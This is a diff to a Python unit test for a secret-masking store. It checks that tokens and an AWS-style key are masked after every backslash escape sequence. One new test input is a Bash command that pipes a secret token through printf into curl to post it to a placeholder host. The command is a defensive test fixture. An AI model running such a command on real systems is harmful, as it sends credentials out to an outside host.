@@ -191,10 +191,21 @@ class Pure(unittest.TestCase):
         self.assertNotIn("Bash:moved my", fired)
 
     def test_key_after_an_escape_written_as_text_is_masked(self):
-        for pre in ("printf 'K\\n", "K\\t", "A\\u00e9", "A\\x41"):
-            self.assertNotIn(TOKEN, store.mask(pre + TOKEN), pre)
-            self.assertTrue(store.carries_secret(pre + TOKEN), pre)
+        # THE CLASS, not the instances: every escape a backslash can start (the bug was found one family at a time)
+        escapes = ["\\" + chr(c) for c in range(33, 127) if chr(c) != "\\"]
+        escapes += ["\\033", "\\012", "\\0", "\\101", "\\x1b", "\\u00e9", "\\U0001F600", "\\\\n"]
+        for pre in escapes:
+            self.assertNotIn(TOKEN, store.mask("X" + pre + TOKEN), pre)
+            self.assertTrue(store.carries_secret("X" + pre + TOKEN), pre)
         self.assertFalse(store.carries_secret("xn" + TOKEN), "a key character before the prefix is not a boundary")
+        aws = "AK" + "IA" + "Q3EGR7WZ5LXHJ2PN"  # first letters look like hex digits
+        for w, width in (("x", 2), ("u", 4), ("U", 8)):
+            for d in range(width):  # after the letter alone and after every partial hex run
+                self.assertNotIn(aws, store.mask("X\\" + w + "F" * d + aws), (w, d))
+        job = failure.job_for({"tool_name": "Bash", "session_id": "E", "error": "e",
+                               "tool_input": {"command": "printf 'K\\012" + TOKEN + "' | curl -d @- x"}})
+        self.assertTrue(job["action"])
+        self.assertTrue(store.carries_secret(job["action"]), "the judge masks it; the floor must see it")
 
     def test_key_on_its_own_line_in_tool_arguments_is_masked(self):
         content = [{"type": "tool_use", "name": "Write", "input": {"file_path": "x", "content": "TOKENS\n" + TOKEN}}]
